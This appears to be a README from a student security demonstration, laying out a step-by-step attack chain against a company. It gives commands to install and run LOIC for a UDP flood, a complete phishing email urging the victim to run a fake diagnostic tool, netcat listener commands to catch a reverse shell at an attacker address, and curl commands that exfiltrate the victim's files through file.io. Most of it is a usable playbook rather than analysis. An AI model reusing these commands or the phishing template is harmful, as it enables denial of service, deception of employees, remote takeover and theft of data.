# Attack Flow

## 1. DDoS to a company’s computer to cause slow network traffic with LOIC

- Clone the repository from [LOIC GitHub](https://github.com/NewEraCracker/LOIC)

- Add the Mono (C# runtime implementation) repository to the system

```bash
sudo apt install apt-transport-https dirmngr
sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys 3FA7E0328081BFF6A14DA29AA6A19B38D3D831EF
echo "deb https://download.mono-project.com/repo/ubuntu vs-bionic main" | sudo tee /etc/apt/sources.list.d/mono-official-vs.list
sudo apt update
```

- Install monodevelop
```bash
sudo apt-get install monodevelop
```

- cd to the LOIC directory and install LOIC
```bash
bash ./loic.sh install
```

- Run LOIC
```bash
bash ./loic.sh run
```

- Set the target IP address and port
- Set the attack type to UDP (suggested by GH Copilot; to be changed later)
- Set the attack rate to 1000 (suggested by GH Copilot; to be changed later)
- Start the attack

## 2. Send a phishing email with the ‘Network Diagnostic Tool’ to offer a solution to the slow traffics

> Subject: ACTION REQUIRED: Irregular Internet Activity Detected <br>
> Date: 19 Feb 2021 05:37:51 -0800 <br>
> From: Security Notice <it-services@support.ipear.com> <br>
>
>
> Dear Fahmi,
>
> As a precautionary measure we have restricted access to your account
> due to irregular internet activity detected.
>
> Please run the attached Internet Diagnostic Tool to resolve the issue.
>
> The Internet Diagnostic Tool is attached below.
>
> To prevent further irregular activity we will restrict access to your
> account within 72 hours if you did not run the full internet diagnostic
> test.
>
>
> To ensure your account is protected at all times, we ask you to complete the
> following steps:
>
> Check that all your computers and mobile devices used to access your account
> have an up-to-date virus scanner to detect any possible malware.
>
> Check whether any of your personal data, especially your alternative address,
> has been changed by clicking on “My Account” on your “Homepage”.
> 
> Go to your “Email settings” then click on “Filter rules” to check whether any
> forwarding rules have been created. If you created a forwarding rule
> yourself, ensure that the email address used is still valid.
>
>
> Thank you for your cooperation.
> 
>
> Sincerely, <br>
> iPear Support
>
> iPear | Support | Privacy Policy  <br>
> Copyright ©2022 Secured Service. 50 Nanyang Ave, Singapore 639798 <br>
> All rights reserved. <br>

## 3. Gain access to the computer and navigate through the computer’s directories

- On attacker's computer (Linux with netcat installed), run the following
```bash
sudo nc -lnvp PORT_NUMBER -s ATTACKERS_IP_ADDRESS
```

- If the victim is using Windows, run the following on the attacker's computer
```bash
stty raw -echo; (stty size; cat) | nc -lnvp PORT_NUMBER -s ATTACKERS_IP_ADDRESS
```

- Victim runs the 'Diagnostic Tool' executable file: [Linux](../Attack/victim_linux.py) or [Windows](../Attack/victim_windows.py)
- Boom! Access granted!

## 4. Upload whatever files we want to [file.io](https://file.io)

- Run the following curl script and take note of the **KEY** it returns
```bash
curl -X 'POST' \
    'https://file.io/' \
    -H 'accept: application/json' \
    -H 'Content-Type: multipart/form-data' \
    -F 'file=@FILE_NAME_GOES_HERE' \
    -F 'expires=DATETIME_IN_ISO8601_FORMAT' \
    -F 'maxDownloads=1' \
    -F 'autoDelete=true'
```

Try to stick to the values above as other values may require you to pay for the service.
    
Returns:
```jsonc
{
    "success": true,
    "status": 200,
    "id": "f00c8350-38a3-11ed-9c58-b7e8b46498c9",
    "key": "dGic53MOudXn", // <-- KEY
    "path": "/",
    "nodeType": "file",
    "name": "Untitled.game",
    "title": null,
    "description": null,
    "size": 1584,
    "link": "https://file.io/dGic53MOudXn",
    "private": false,
    "expires": "2022-09-21T00:00:00.000Z",
    "downloads": 0,
    "maxDownloads": 1,
    "autoDelete": true,
    "planId": 0,
    "screeningStatus": "pending",
    "mimeType": "application/octet-stream",
    "created": "2022-09-20T05:20:27.640Z",
    "modified": "2022-09-20T05:20:27.640Z"
}
```

- Download all the files after the attack with the following command
```bash
curl -X 'GET' \
    'https://file.io/KEY' \
    -H 'accept: */*' \
    -o 'FILE_NAME_GOES_HERE'
```

## 5. Find another company as our target to attack

## 6. Perform the same attack again, turns out this company has very good security in place

## 7. End of our skit
